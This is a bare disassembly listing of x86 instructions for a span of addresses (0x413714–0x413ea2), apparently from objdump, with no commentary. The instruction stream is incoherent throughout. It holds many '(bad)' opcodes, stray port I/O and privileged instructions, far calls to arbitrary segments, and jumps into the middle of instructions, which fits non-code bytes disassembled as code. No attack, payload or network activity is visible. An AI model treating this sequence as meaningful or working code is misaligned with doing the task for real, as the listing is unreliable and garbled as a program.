  413714:	mov    esi,0x8c7587b
  413719:	and    BYTE PTR [eax+edx*2+0x4d],bh
  41371d:	test   ah,cl
  41371f:	stos   BYTE PTR es:[edi],al
  413720:	jg     0x413743
  413722:	ror    BYTE PTR cs:[eax+0x1f],1
  413726:	enter  0x9dda,0x8
  41372a:	call   0x1d98:0x3fce5b55
  413731:	jnp    0x4136c4
  413733:	and    ecx,DWORD PTR [ebp+ebp*4-0x3d]
  413737:	mov    ?,WORD PTR [ebp+0x62]
  41373a:	pop    edi
  41373b:	xor    DWORD PTR [ebx],esp
  41373d:	or     BYTE PTR [ebp-0x21],dh
  413740:	adc    BYTE PTR [edx+0xf2a34b3],bl
  413746:	fdiv   DWORD PTR [eax]
  413748:	mov    ecx,0x544f63e7
  41374d:	rol    ah,cl
  41374f:	in     al,dx
  413750:	fidiv  DWORD PTR [ebx-0x66]
  413753:	jns    0x4136da
  413755:	iret   
  413756:	pop    ss
  413757:	push   0x6a
  413759:	dec    edi
  41375a:	adc    DWORD PTR [ebx-0x5e9311db],esi
  413760:	repz repz rol DWORD PTR [ebx-0x74],0x2
  413766:	or     eax,0xf0270a02
  41376b:	pushf  
  41376c:	xor    eax,ebp
  41376e:	pop    ebx
  41376f:	adc    eax,ebp
  413771:	call   0x7590:0xc89520c9
  413778:	add    ah,bh
  41377a:	mov    WORD PTR [ebp+ebp*1+0x2a],gs
  41377e:	iret   
  41377f:	nop
  413780:	addr16 xchg ecx,eax
  413782:	xor    BYTE PTR [edi+0x6d7df676],dh
  413788:	sahf   
  413789:	das    
  41378a:	test   esi,edx
  41378c:	std    
  41378d:	xchg   ecx,eax
  41378e:	(bad)  
  41378f:	hlt    
  413790:	pop    esi
  413791:	xor    ah,BYTE PTR [eax-0x39dc7238]
  413797:	jne    0x413754
  413799:	(bad)  
  41379a:	fnstcw WORD PTR [edx]
  41379c:	cmovae eax,DWORD PTR [ebp-0x4dca922e]
  4137a3:	aad    0x72
  4137a5:	inc    esi
  4137a6:	push   ecx
  4137a7:	call   0xe171b52f
  4137ac:	add    dl,al
  4137ae:	mov    eax,ds:0xff66ab1a
  4137b3:	jmp    0x41381e
  4137b5:	(bad)  
  4137b6:	iret   
  4137b7:	hlt    
  4137b8:	adc    ebx,DWORD PTR [eax+0x55]
  4137bb:	dec    ebp
  4137bc:	jne    0x4137c4
  4137be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137bf:	cli    
  4137c0:	sahf   
  4137c1:	and    al,0xd
  4137c3:	std    
  4137c4:	mov    ?,WORD PTR fs:[eax-0x772ad99f]
  4137cb:	loope  0x41375d
  4137cd:	jecxz  0x413798
  4137cf:	out    0xae,al
  4137d1:	xor    DWORD PTR [ecx-0x74],esp
  4137d4:	xchg   ebx,eax
  4137d5:	mov    eax,ds:0x78835766
  4137da:	inc    ebp
  4137db:	sub    BYTE PTR [ecx-0x9],ch
  4137de:	shr    ch,1
  4137e0:	imul   edi,DWORD PTR [esp+ebp*1+0x38],0x4e8f8ad2
  4137e8:	fwait
  4137e9:	lahf   
  4137ea:	aad    0x5f
  4137ec:	or     DWORD PTR [esi-0x65],0xffffff97
  4137f0:	mov    ebp,0xfc0d9ad3
  4137f5:	xchg   edx,eax
  4137f6:	out    0x1d,al
  4137f8:	arpl   WORD PTR [edi+0x4927ea22],dx
  4137fe:	inc    bx
  413800:	nop
  413801:	(bad)  
  413802:	push   ds
  413803:	xchg   edi,eax
  413804:	mov    ecx,0xfab9f08a
  413809:	xlat   BYTE PTR ds:[ebx]
  41380a:	(bad)  
  41380b:	outs   dx,BYTE PTR ds:[esi]
  41380c:	xor    eax,0xab973e77
  413811:	int3   
  413812:	loope  0x413893
  413814:	xor    ah,dh
  413816:	ds mov eax,0x1a03cb77
  41381c:	ret    0x16ac
  41381f:	daa    
  413820:	lods   al,BYTE PTR ds:[esi]
  413821:	cmp    edx,DWORD PTR ds:0x4f6a2297
  413827:	fstp   DWORD PTR [esi+0x1e]
  41382a:	test   DWORD PTR [ebp-0x1e],edx
  41382d:	xchg   esi,eax
  41382e:	data16 je 0x4137ed
  413831:	in     eax,0xc1
  413833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413834:	jmp    0x4137b9
  413836:	lock (bad) 
  413838:	mov    ebx,0xec9d67f1
  41383d:	sbb    eax,0x51ad77fd
  413842:	or     eax,0x3011dd44
  413847:	mov    eax,ds:0x82c37d97
  41384c:	cli    
  41384d:	call   0xbc99d839
  413852:	enter  0x4428,0xf6
  413856:	push   esi
  413857:	mov    eax,ds:0x4360e5
  41385c:	jg     0x41389e
  41385e:	add    al,0x45
  413860:	cdq    
  413861:	xchg   edx,eax
  413862:	add    DWORD PTR [esi+eiz*1-0x3c],ebx
  413866:	mov    al,ds:0xc48bae10
  41386b:	std    
  41386c:	sub    al,0xb9
  41386e:	add    edi,DWORD PTR [ebp-0x4a]
  413871:	mov    edi,0x526ddb86
  413877:	retf   
  413878:	popf   
  413879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41387a:	dec    esp
  41387b:	enter  0x69aa,0x2d
  41387f:	lock imul esp,eax,0xffffffc1
  413883:	int3   
  413884:	in     eax,dx
  413885:	mov    al,ds:0x3e00238b
  41388a:	clc    
  41388b:	in     eax,dx
  41388c:	dec    ebx
  41388d:	rcl    BYTE PTR [edi+eiz*4-0x381a4e9a],1
  413894:	call   0x4d1604ff
  413899:	xchg   ecx,eax
  41389a:	jb     0x4138a8
  41389c:	loop   0x41385b
  41389e:	out    dx,eax
  41389f:	xor    eax,0x2a9c3d48
  4138a4:	xchg   ecx,eax
  4138a5:	out    0xae,eax
  4138a7:	rol    esi,1
  4138a9:	adc    ah,BYTE PTR [esi+0x6bd185fe]
  4138af:	into   
  4138b0:	pop    esp
  4138b1:	xchg   edx,eax
  4138b2:	push   ax
  4138b4:	pop    ebx
  4138b5:	out    0x49,al
  4138b7:	dec    edi
  4138b8:	and    DWORD PTR [edx+ebx*8-0x29671ba8],0x8
  4138c0:	jae    0x41390d
  4138c2:	mov    ebp,0xa19f94e4
  4138c7:	sahf   
  4138c8:	or     BYTE PTR ss:[esi],0x36
  4138cc:	lods   al,BYTE PTR ds:[esi]
  4138cd:	scas   eax,DWORD PTR es:[edi]
  4138ce:	xchg   edi,eax
  4138cf:	cmp    BYTE PTR [edi],dh
  4138d1:	out    dx,eax
  4138d2:	xor    ebx,DWORD PTR cs:[edi]
  4138d5:	scas   eax,DWORD PTR es:[edi]
  4138d6:	repnz mov BYTE PTR [ebx],bl
  4138d9:	int3   
  4138da:	test   al,0xe
  4138dc:	imul   ecx,DWORD PTR fs:[ecx],0xce4a56d8
  4138e3:	sahf   
  4138e4:	lds    edi,FWORD PTR [eax+ebp*1-0x3d226064]
  4138eb:	arpl   WORD PTR [ebp+ecx*2+0x397c7e08],cx
  4138f2:	fwait
  4138f3:	arpl   WORD PTR [edx+ecx*1+0x4055d221],cx
  4138fa:	add    eax,0x2bae285b
  4138ff:	out    dx,al
  413900:	test   eax,0xac2c0665
  413905:	ja     0x413942
  413907:	inc    edi
  413908:	jp     0x413935
  41390a:	mov    WORD PTR [eax-0xe],gs
  41390d:	push   ebp
  41390e:	mov    ah,0x8c
  413910:	daa    
  413911:	in     al,0x8e
  413913:	aam    0xbe
  413915:	push   esp
  413916:	ret    
  413917:	sbb    eax,0x262c79c0
  41391c:	lods   eax,DWORD PTR ds:[esi]
  41391d:	mov    esp,DWORD PTR [edx]
  41391f:	(bad)  
  413920:	dec    eax
  413921:	push   esi
  413922:	mov    edi,DWORD PTR [edx+0x48]
  413925:	fwait
  413926:	loope  0x413930
  413928:	push   ebp
  413929:	adc    eax,0x395a7e61
  41392e:	data16 and al,0xf7
  413931:	dec    BYTE PTR [esi]
  413933:	xchg   ecx,eax
  413934:	into   
  413935:	cmp    ebp,ecx
  413937:	fbstp  TBYTE PTR ds:0x89b6f764
  41393d:	lds    ebp,FWORD PTR [edi]
  41393f:	mov    cl,0x1b
  413941:	popf   
  413942:	aaa    
  413943:	or     al,bl
  413945:	cmp    edx,DWORD PTR [edi+0x7fb95e2c]
  41394b:	imul   esi,esp,0x8d3acf21
  413951:	(bad)  
  413952:	fidiv  DWORD PTR [ebx-0x116fb7bb]
  413958:	aam    0x6e
  41395a:	inc    ecx
  41395b:	cld    
  41395c:	inc    esi
  41395d:	add    DWORD PTR ss:[ecx],esp
  413960:	xchg   ax,cx
  413963:	xlat   BYTE PTR ds:[ebx]
  413964:	pushf  
  413965:	rcr    BYTE PTR [eax+edx*8+0xe09efb0],1
  41396c:	pop    esp
  41396d:	mov    dl,0x27
  41396f:	add    eax,0x55d20d03
  413974:	mov    esp,0x4f2f1721
  413979:	pop    ds
  41397a:	or     al,dh
  41397c:	test   eax,0xb73d4c24
  413981:	xor    cl,BYTE PTR [ebx-0xc]
  413984:	xchg   esi,eax
  413985:	pop    ebx
  413986:	pop    ds
  413987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413988:	mov    bh,0x8
  41398a:	ret    0xcfdb
  41398d:	dec    ebp
  41398e:	or     ebp,DWORD PTR [ecx-0x4612bcda]
  413994:	push   ebp
  413995:	out    dx,al
  413996:	inc    edx
  413997:	ins    DWORD PTR es:[edi],dx
  413998:	mov    ds:0x22dee169,al
  41399d:	das    
  41399e:	inc    esi
  41399f:	sqrtps xmm1,XMMWORD PTR [edi-0x13ab2659]
  4139a6:	dec    esi
  4139a7:	ret    0x276d
  4139aa:	bswap  edx
  4139ac:	jp     0x4139c2
  4139ae:	pop    eax
  4139af:	pusha  
  4139b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139b1:	pop    edx
  4139b2:	sti    
  4139b3:	adc    DWORD PTR [eax-0x43],edi
  4139b6:	cmp    dl,ah
  4139b8:	xor    BYTE PTR [ecx-0x2a3a53ff],0x13
  4139bf:	and    DWORD PTR [edx-0x1152a53e],0x5b
  4139c6:	push   esi
  4139c7:	fs jae 0x4139c7
  4139ca:	mov    ds:0xbb40f2ff,al
  4139cf:	in     al,0xc1
  4139d1:	cmp    al,0xd7
  4139d3:	scas   al,BYTE PTR es:[edi]
  4139d4:	mov    ah,0x54
  4139d6:	jo     0x413971
  4139d8:	(bad)  
  4139d9:	ins    BYTE PTR es:[edi],dx
  4139da:	push   esp
  4139db:	adc    BYTE PTR [eax+0x302ceb55],dh
  4139e1:	in     al,0xb0
  4139e3:	out    dx,al
  4139e4:	sbb    al,0xf0
  4139e6:	and    edi,DWORD PTR [edi+0x794563c4]
  4139ec:	cli    
  4139ed:	jae    0x4139b4
  4139ef:	addr16 icebp 
  4139f1:	adc    al,0x6
  4139f3:	mov    edi,0x8e026627
  4139f8:	rcr    BYTE PTR [edx],cl
  4139fa:	scas   al,BYTE PTR es:[edi]
  4139fb:	adc    BYTE PTR [edi-0x17fb79e2],bh
  413a01:	jmp    0x497d259f
  413a06:	pop    esi
  413a07:	mov    DWORD PTR [ecx+0x3a7f4ba6],esp
  413a0d:	pop    ebx
  413a0e:	xor    eax,0x610d6514
  413a13:	pop    ebp
  413a14:	and    eax,0xb3d227fa
  413a19:	inc    eax
  413a1a:	xor    edx,DWORD PTR [edi+ecx*2+0x62dca21a]
  413a21:	xchg   ecx,eax
  413a22:	cmp    al,0xc4
  413a24:	xor    al,0xd3
  413a26:	das    
  413a27:	adc    BYTE PTR [ecx-0x7f5fbc3],ch
  413a2d:	xchg   DWORD PTR [ebx+0xd],ebx
  413a30:	mov    al,0x75
  413a32:	in     eax,dx
  413a33:	mov    al,0x3a
  413a35:	ret    0xfd52
  413a38:	lahf   
  413a39:	mov    ebp,DWORD PTR [esi]
  413a3b:	nop
  413a3c:	xchg   esi,eax
  413a3d:	aad    0x8f
  413a3f:	jp     0x413ab0
  413a41:	push   ebp
  413a42:	xchg   ecx,eax
  413a43:	xchg   edi,eax
  413a44:	lods   al,BYTE PTR ds:[esi]
  413a45:	aad    0xb5
  413a47:	sub    al,0x26
  413a49:	das    
  413a4a:	inc    esi
  413a4b:	dec    esi
  413a4c:	mov    WORD PTR [edx],fs
  413a4e:	or     esp,esp
  413a50:	popa   
  413a51:	mov    al,ds:0xc60358f4
  413a56:	or     eax,0xd6e31deb
  413a5b:	lahf   
  413a5c:	dec    ecx
  413a5d:	add    eax,DWORD PTR [ecx+0x3e5e7a33]
  413a63:	inc    edi
  413a64:	sub    ah,0x64
  413a67:	inc    esi
  413a68:	(bad)  
  413a69:	cmp    ah,BYTE PTR [edi+esi*1]
  413a6c:	push   ss
  413a6d:	mov    ecx,0xb2d0329e
  413a72:	data16 out 0xf9,al
  413a75:	dec    edx
  413a76:	sub    al,0xf0
  413a78:	dec    edx
  413a79:	dec    edi
  413a7a:	inc    eax
  413a7b:	lds    eax,FWORD PTR [ebx+ecx*2+0x78]
  413a7f:	(bad)  
  413a80:	push   edx
  413a81:	aaa    
  413a82:	mov    eax,ds:0xf8e809c8
  413a87:	pop    ecx
  413a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a89:	mov    edx,ecx
  413a8b:	push   ebp
  413a8c:	xlat   BYTE PTR ds:[ebx]
  413a8d:	inc    ebx
  413a8e:	icebp  
  413a8f:	inc    edi
  413a90:	push   ecx
  413a91:	pop    ds
  413a92:	call   0xda40:0xc4644022
  413a99:	dec    edx
  413a9a:	add    cl,al
  413a9c:	dec    esp
  413a9d:	xor    dh,BYTE PTR cs:[eax]
  413aa0:	push   es
  413aa1:	xchg   BYTE PTR [eax-0x3136ed47],ch
  413aa7:	es push edx
  413aa9:	mov    edx,ebx
  413aab:	add    edi,DWORD PTR [ecx+0x2d834afe]
  413ab1:	dec    ebx
  413ab2:	dec    esi
  413ab3:	fstp   DWORD PTR [ebx+0x5]
  413ab6:	loop   0x413ade
  413ab8:	lahf   
  413ab9:	iret   
  413aba:	addr16 dec ebp
  413abc:	jp     0x413aa6
  413abe:	push   ebp
  413abf:	jg     0x413b35
  413ac1:	jmp    0xec24a91a
  413ac6:	adc    BYTE PTR [eax],dl
  413ac8:	ins    BYTE PTR es:[edi],dx
  413ac9:	sub    ch,bl
  413acb:	pop    ds
  413acc:	pop    ebp
  413acd:	stc    
  413ace:	in     al,0x38
  413ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ad1:	mov    ds:0x862805a,eax
  413ad6:	inc    ebp
  413ad7:	mov    ecx,0x8ccc2b67
  413adc:	(bad)  
  413ade:	scas   al,BYTE PTR es:[edi]
  413adf:	clc    
  413ae0:	fld    DWORD PTR [eax+0x64348a01]
  413ae6:	mov    ebx,0xc9a7cabc
  413aeb:	les    esi,FWORD PTR [ebp+edx*2-0x7d9eb54a]
  413af2:	iret   
  413af3:	dec    ebp
  413af4:	mov    al,cs:0x7f92a609
  413afa:	lea    eax,ds:0xdaced42e
  413b00:	in     al,dx
  413b01:	lds    edi,FWORD PTR [ebp-0x32]
  413b04:	jecxz  0x413b77
  413b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b08:	or     al,0x72
  413b0a:	dec    eax
  413b0b:	data16 cld 
  413b0d:	and    DWORD PTR [ecx],ebx
  413b0f:	test   BYTE PTR cs:[edi-0x3a],dh
  413b13:	mov    ebp,0xc560afdf
  413b18:	in     al,dx
  413b19:	popa   
  413b1a:	jmp    0x9ab7:0xe7711e7b
  413b21:	xchg   esp,eax
  413b22:	mov    dh,0x66
  413b24:	or     eax,0xa99fef3
  413b29:	sbb    al,BYTE PTR [esi-0x38a65431]
  413b2f:	mov    esi,0xc88bfc2d
  413b34:	fisub  WORD PTR [ebx+0x2b]
  413b37:	(bad)  [edx]
  413b39:	push   ds
  413b3a:	ror    edi,cl
  413b3c:	jae    0x413bb1
  413b3e:	div    BYTE PTR [edx+0x2]
  413b41:	xchg   DWORD PTR [edx],ebp
  413b43:	std    
  413b44:	jp     0x413b48
  413b46:	std    
  413b47:	sbb    DWORD PTR [edx-0x1b],0x26
  413b4b:	mov    BYTE PTR [ebx],al
  413b4d:	lds    edi,FWORD PTR [ecx]
  413b4f:	imul   BYTE PTR [ebp-0x79fbf065]
  413b55:	inc    ebx
  413b56:	xor    BYTE PTR [ecx-0x6c198ddd],dh
  413b5c:	pop    esp
  413b5d:	popf   
  413b5e:	xor    bl,BYTE PTR [ecx+esi*8+0x46]
  413b62:	test   DWORD PTR ss:[edi-0x4b],edi
  413b66:	pop    edi
  413b67:	jg     0x413bbc
  413b69:	dec    eax
  413b6a:	xchg   BYTE PTR [eax],dh
  413b6c:	fs mov bl,0xa5
  413b6f:	dec    esi
  413b70:	(bad)  
  413b71:	fiadd  DWORD PTR [ebx+edi*4+0x43e6aa5b]
  413b78:	xor    ebx,0x44
  413b7b:	xor    eax,0x337ca9f5
  413b80:	rcr    ebp,cl
  413b82:	inc    esi
  413b83:	sub    al,0xe3
  413b85:	dec    edi
  413b86:	or     ah,0xdd
  413b89:	and    ebx,ecx
  413b8b:	rcl    DWORD PTR [edi+0x6ccd359d],cl
  413b91:	test   dh,0xe9
  413b94:	ja     0x413bbe
  413b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b97:	ss dec esp
  413b99:	dec    ebx
  413b9a:	adc    bl,BYTE PTR [esi]
  413b9c:	add    eax,0x8fda1da0
  413ba1:	adc    al,0xa1
  413ba3:	add    eax,0x5670cf86
  413ba8:	sahf   
  413ba9:	inc    ecx
  413baa:	js     0x413b65
  413bac:	fs pushf 
  413bae:	inc    esi
  413baf:	or     esp,DWORD PTR [ebx-0x7f]
  413bb2:	sti    
  413bb3:	jmp    0x3b5952c2
  413bb8:	pop    eax
  413bb9:	sbb    esp,0xffffffa6
  413bbc:	xchg   esp,eax
  413bbd:	and    BYTE PTR [edi+0x7894072c],al
  413bc3:	lea    eax,ds:0x69b2aaea
  413bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bca:	sahf   
  413bcb:	inc    esp
  413bcc:	arpl   WORD PTR [edx+0x4f138a14],ax
  413bd2:	imul   ecx,esp,0x4bf5fbbb
  413bd8:	and    al,0x72
  413bda:	mov    ecx,0x59e60f9e
  413bdf:	addr16 and eax,0x3796843d
  413be5:	adc    al,0x39
  413be7:	in     eax,dx
  413be8:	sub    ch,0x4d
  413beb:	inc    esp
  413bec:	aad    0xb2
  413bee:	test   al,0x7b
  413bf0:	es nop
  413bf2:	cmc    
  413bf3:	xchg   esi,eax
  413bf4:	in     eax,dx
  413bf5:	in     al,dx
  413bf6:	and    DWORD PTR [edx+0xb],esp
  413bf9:	and    DWORD PTR [esi],ecx
  413bfb:	call   0xdfa5b666
  413c00:	and    bh,ch
  413c02:	loopne 0x413c2b
  413c04:	test   al,0xc
  413c06:	call   0x52e6bfc9
  413c0b:	rcr    DWORD PTR [eax],1
  413c0d:	push   esi
  413c0e:	lahf   
  413c0f:	ja     0x413bbf
  413c11:	ins    DWORD PTR es:[edi],dx
  413c12:	sbb    eax,0xecd962cb
  413c17:	dec    eax
  413c18:	jne    0x413bc7
  413c1a:	out    0x85,al
  413c1c:	ins    DWORD PTR es:[edi],dx
  413c1d:	in     al,0x12
  413c1f:	lds    esi,FWORD PTR [esi+0x6169b23e]
  413c25:	jecxz  0x413c9b
  413c27:	mov    dl,BYTE PTR [ebp-0x34]
  413c2a:	ret    
  413c2b:	pop    es
  413c2c:	fist   WORD PTR [edx+0x425ab2a7]
  413c32:	into   
  413c33:	mov    bh,BYTE PTR [ecx-0x638d514e]
  413c39:	mov    WORD PTR [edi-0x1],fs
  413c3c:	sar    BYTE PTR [esi],0xc6
  413c3f:	js     0x413c21
  413c41:	xor    al,BYTE PTR [edx+0x2ea92eb3]
  413c47:	or     al,0x24
  413c49:	jae    0x413c3f
  413c4b:	imul   edi,DWORD PTR [esi+0x13f2dc13],0x9
  413c52:	and    esi,DWORD PTR [ecx+ecx*2-0x20]
  413c56:	and    DWORD PTR [ecx+0x26],esp
  413c59:	push   ebx
  413c5a:	xor    al,BYTE PTR [esp+edi*4-0x51c6209b]
  413c61:	add    al,0x51
  413c63:	pop    es
  413c64:	dec    edi
  413c65:	mov    esi,0x5b0a98cf
  413c6a:	inc    eax
  413c6b:	sti    
  413c6c:	xor    bl,BYTE PTR [ebx-0x260c8657]
  413c72:	aas    
  413c73:	mov    ecx,0xe482fdd4
  413c78:	sbb    DWORD PTR [eax-0x1d],esp
  413c7b:	scas   al,BYTE PTR es:[edi]
  413c7c:	mov    bl,dl
  413c7e:	aaa    
  413c7f:	push   eax
  413c80:	cli    
  413c81:	and    dl,BYTE PTR [eax+ecx*8]
  413c84:	xchg   ebx,eax
  413c85:	cwde   
  413c86:	mov    edi,0xd25f4533
  413c8b:	and    BYTE PTR ds:0x881b456a,ah
  413c91:	jecxz  0x413cb0
  413c93:	nop
  413c94:	jmp    0x5837f09d
  413c99:	lods   eax,DWORD PTR ds:[esi]
  413c9a:	xor    DWORD PTR [edi-0x24],edx
  413c9d:	push   es
  413c9e:	push   cs
  413c9f:	out    0xf7,al
  413ca1:	(bad)  
  413ca2:	das    
  413ca3:	(bad)  
  413ca5:	push   ss
  413ca6:	mov    dl,0xda
  413ca8:	test   BYTE PTR [edi],0x86
  413cab:	push   ebp
  413cac:	inc    ebx
  413cad:	loopne 0x413ca1
  413caf:	mov    dh,BYTE PTR [ebx]
  413cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cb2:	retf   
  413cb3:	cmp    cl,ch
  413cb5:	aaa    
  413cb6:	lods   eax,DWORD PTR ds:[esi]
  413cb7:	jg     0x413cff
  413cb9:	stos   DWORD PTR es:[edi],eax
  413cba:	or     dh,BYTE PTR cs:0x65fc5af9
  413cc1:	les    ebp,FWORD PTR [ebp+0x78]
  413cc4:	jo     0x413ced
  413cc6:	outs   dx,DWORD PTR ds:[esi]
  413cc7:	xor    DWORD PTR ds:0x3d031c3d,ebx
  413ccd:	retf   
  413cce:	adc    dh,BYTE PTR [edi+0x3e492ddc]
  413cd4:	jg     0x413cb7
  413cd6:	jo     0x413cf8
  413cd8:	xchg   ebp,eax
  413cd9:	fs xchg edi,eax
  413cdb:	(bad)  
  413cdc:	mov    ebp,0x17d0a5e0
  413ce1:	xor    ebp,edi
  413ce3:	into   
  413ce4:	inc    ecx
  413ce5:	adc    dl,bh
  413ce7:	mov    BYTE PTR [edx-0x671ef48f],0xcd
  413cee:	in     al,0xe2
  413cf0:	xchg   ebx,eax
  413cf1:	ror    DWORD PTR [ecx],cl
  413cf3:	imul   esp,DWORD PTR [ecx],0xffffffe7
  413cf6:	(bad)  
  413cf7:	push   edx
  413cf8:	sbb    al,0x24
  413cfa:	(bad)  
  413cfc:	lock push edx
  413cfe:	sbb    bl,bl
  413d00:	les    ebx,FWORD PTR [esi-0x1b]
  413d03:	int3   
  413d04:	fmul   DWORD PTR [ebx]
  413d06:	or     eax,DWORD PTR [ecx+0x64]
  413d09:	or     BYTE PTR [ebp-0x79dc2e22],0xfc
  413d10:	loopne 0x413c95
  413d12:	sub    BYTE PTR [ebp+0x7ff68396],ah
  413d18:	or     ebp,esi
  413d1a:	(bad)  
  413d1b:	(bad)  
  413d1c:	imul   bl
  413d1e:	sbb    ecx,DWORD PTR [edi-0x62e50e7]
  413d24:	(bad)  
  413d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d26:	in     al,dx
  413d27:	mov    bh,0x8e
  413d29:	fwait
  413d2a:	sbb    ah,BYTE PTR [edx+esi*4-0x4f1ccdfe]
  413d31:	pop    es
  413d32:	cmp    ebp,DWORD PTR [esi+0x6bfb8cec]
  413d38:	iret   
  413d39:	jle    0x413cce
  413d3b:	(bad)  
  413d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d3d:	cli    
  413d3e:	lds    ebx,FWORD PTR [ecx+0x7e729585]
  413d44:	sbb    al,0xa3
  413d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d47:	mov    WORD PTR [edx],ss
  413d49:	adc    ebx,DWORD PTR [esi+0x1cdb5dc0]
  413d4f:	sub    eax,0xdf20fd6e
  413d54:	out    0x65,eax
  413d56:	into   
  413d57:	jbe    0x413d5d
  413d59:	lods   al,BYTE PTR ds:[esi]
  413d5a:	and    edx,DWORD PTR [ebp-0x24]
  413d5d:	mov    ss,WORD PTR [eax+ebx*1]
  413d60:	dec    esp
  413d61:	adc    ebx,esi
  413d63:	mov    ecx,0x9dcce310
  413d68:	xchg   esp,eax
  413d69:	xchg   DWORD PTR [edx],esp
  413d6b:	pop    es
  413d6c:	ret    
  413d6d:	lds    ebp,FWORD PTR [eax-0x3b]
  413d70:	inc    ecx
  413d71:	jg     0x413d84
  413d73:	pop    edi
  413d74:	mov    esp,eax
  413d76:	jns    0x413dc0
  413d78:	add    esp,DWORD PTR [esi]
  413d7a:	(bad)  
  413d7b:	jno    0x413db1
  413d7d:	ss pop ds
  413d7f:	ret    
  413d80:	pop    ecx
  413d81:	mov    eax,ds:0x35be556e
  413d86:	adc    BYTE PTR [ebp+0x20],dh
  413d89:	(bad)  
  413d8b:	cmp    DWORD PTR [ebp-0x6],esp
  413d8e:	pop    eax
  413d8f:	in     al,0xc9
  413d91:	out    dx,al
  413d92:	or     al,0xe4
  413d94:	mov    dl,0x8b
  413d96:	dec    edx
  413d97:	inc    edx
  413d98:	sbb    DWORD PTR [ebx-0x1ffe5c17],ebx
  413d9e:	ins    BYTE PTR es:[edi],dx
  413d9f:	xlat   BYTE PTR ds:[ebx]
  413da0:	adc    bh,bl
  413da2:	leave  
  413da3:	scas   eax,DWORD PTR es:[edi]
  413da4:	sub    eax,0x46191513
  413da9:	sub    bl,BYTE PTR [edx]
  413dab:	push   ss
  413dac:	stos   BYTE PTR es:[edi],al
  413dad:	mov    BYTE PTR [edx],dl
  413daf:	push   edi
  413db0:	loope  0x413d3b
  413db2:	mov    ecx,0x670ab388
  413db7:	rcl    bh,1
  413db9:	push   0x11014963
  413dbe:	cmp    BYTE PTR [ebx+edx*4-0x17],cl
  413dc2:	mov    al,ds:0xd145beb9
  413dc7:	pop    ecx
  413dc8:	lea    ecx,[ecx+0x13]
  413dcb:	cmp    DWORD PTR [ebx+eiz*2-0xb],esi
  413dcf:	dec    esi
  413dd0:	out    dx,al
  413dd1:	jg     0x413d7c
  413dd3:	mov    ds:0xddff14dc,eax
  413dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dd9:	jl     0x413db4
  413ddb:	sar    esp,0xf
  413dde:	pop    esp
  413ddf:	ins    BYTE PTR es:[edi],dx
  413de0:	adc    ecx,DWORD PTR [ebx+0x1af24adf]
  413de6:	pop    es
  413de7:	xor    eax,0xafbda190
  413dec:	xchg   esp,eax
  413ded:	lds    esi,FWORD PTR [esi+0x7e]
  413df0:	aaa    
  413df1:	mov    cl,0x53
  413df3:	out    dx,eax
  413df4:	call   0x7122:0x6f87d8ca
  413dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dfc:	les    edx,FWORD PTR [edi-0x343cffaa]
  413e02:	fucom  st(2)
  413e04:	out    0xeb,al
  413e06:	pop    esi
  413e07:	neg    BYTE PTR [eax-0x7e]
  413e0a:	ret    0xb8c4
  413e0d:	lock pop ebx
  413e0f:	jns    0x413de6
  413e11:	dec    ebp
  413e12:	(bad)  
  413e13:	cld    
  413e14:	push   0x76
  413e16:	jl     0x413dcc
  413e18:	bound  esi,QWORD PTR [ecx+0x54]
  413e1b:	sar    BYTE PTR [eax+eiz*1],cl
  413e1e:	jg     0x413e0c
  413e20:	cld    
  413e21:	daa    
  413e22:	mov    eax,0xc16daf4d
  413e27:	nop
  413e28:	mov    ah,0xeb
  413e2a:	cmp    al,0x81
  413e2c:	test   BYTE PTR [eax],ah
  413e2e:	rcr    BYTE PTR [edx],cl
  413e30:	xchg   edi,eax
  413e31:	xor    DWORD PTR cs:[ecx],edx
  413e34:	lahf   
  413e35:	mov    ds:0xbceed716,al
  413e3a:	xor    BYTE PTR [edi],ah
  413e3c:	mov    ds:0x198dfc4,al
  413e41:	inc    esi
  413e42:	rcr    DWORD PTR [edi-0x69],0xd5
  413e46:	push   edi
  413e47:	sub    edi,ebp
  413e49:	loopne 0x413e4d
  413e4b:	das    
  413e4c:	aaa    
  413e4d:	test   al,0x2d
  413e4f:	shl    DWORD PTR [ecx],1
  413e51:	lds    edx,FWORD PTR [edi+0x1faa213a]
  413e57:	ins    BYTE PTR es:[edi],dx
  413e58:	std    
  413e59:	lea    ebx,[ebx-0xee01ffd]
  413e5f:	sbb    DWORD PTR [esp+ebx*2],ecx
  413e62:	mov    dl,bh
  413e64:	mov    bl,0x67
  413e66:	sub    BYTE PTR [edi],dh
  413e68:	inc    ecx
  413e69:	retf   0x1348
  413e6c:	shl    BYTE PTR [ebx-0x36],cl
  413e6f:	and    dh,bh
  413e71:	nop
  413e72:	and    dh,BYTE PTR [ecx+ebp*4+0x50730fea]
  413e79:	fstp   DWORD PTR [ecx-0x11]
  413e7c:	inc    ecx
  413e7d:	(bad)  
  413e7e:	and    al,0xa8
  413e80:	mov    edi,0x2dd6d61a
  413e85:	lds    ebx,FWORD PTR [eax-0x4f]
  413e88:	dec    ebp
  413e89:	cli    
  413e8a:	jmp    0x413ef4
  413e8c:	in     eax,0x3f
  413e8e:	xchg   esi,eax
  413e8f:	jno    0x413e3b
  413e91:	inc    eax
  413e92:	test   ebp,ebp
  413e94:	and    DWORD PTR [eax+0x23989832],eax
  413e9a:	sbb    eax,0x9bdcc5d6
  413e9f:	fcomp  DWORD PTR [ebx-0x2f]
  413ea2:	and    bl,BYTE PTR [ecx+0x3e]
